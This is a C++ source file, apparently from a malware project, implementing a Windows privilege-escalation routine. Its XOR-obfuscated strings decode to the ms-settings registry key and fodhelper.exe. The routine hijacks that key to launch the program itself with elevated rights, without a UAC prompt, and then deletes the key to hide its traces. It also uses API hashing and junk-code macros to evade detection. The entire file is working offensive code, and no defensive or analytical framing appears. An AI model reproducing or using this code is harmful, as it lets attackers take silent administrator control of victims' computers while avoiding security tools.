#include <windows.h>
#include <comutil.h>
#include <comdef.h>
#include <string> 
#include <thread>
#include "../../include/core/stealth.h"
#include "../../include/utils/obfuscation.h"
#include "../../include/utils/syscalls.h"
#include <shellapi.h>

std::string Crypt(std::string data) {
    char key = 0x7F; 
    for (size_t i = 0; i < data.size(); i++) data[i] ^= key;
    return data;
}

bool ElevatePrivileges() {
    JUNK_CODE_BLOCK;

    std::string regPath = Crypt("\x2C\x10\x19\x0B\x08\x1E\x0D\x1A\x23\x3C\x13\x1E\x0C\x0C\x1A\x0C\x3D\x12\x0C\x32\x0C\x1A\x0B\x0B\x16\x11\x18\x0C\x2C\x37\x17\x1A\x13\x13\x32\x30\x0F\x1A\x11\x32\x1C\x10\x12\x12\x1E\x11\x1B");
    std::string delExec = Crypt("\x3B\x1A\x13\x1A\x18\x10\x0B\x1A\x3A\x07\x1A\x1C\x0A\x0B\x1A");
    std::string targetApp = Crypt("\x19\x10\x1B\x17\x1A\x13\x0F\x1A\x0D\x51\x1A\x07\x1A");

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hKey;
    typedef LSTATUS(WINAPI* pRegCreate)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
    pRegCreate _RegCreateKeyExA = (pRegCreate)GetAPI(GetModuleHandleA("advapi32.dll"), HashAPI("RegCreateKeyExA"));

    if (_RegCreateKeyExA(HKEY_CURRENT_USER, regPath.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)path, strlen(path));
        RegSetValueExA(hKey, delExec.c_str(), 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);

        JUNK_CODE_BLOCK;

        ShellExecuteA(NULL, "open", targetApp.c_str(), NULL, NULL, SW_HIDE);

        std::thread cleanup([regPath]() {
            Sleep(5000);
            RegDeleteTreeA(HKEY_CURRENT_USER, regPath.c_str());
        });
        cleanup.detach();

        return true;
    }
    return false;
}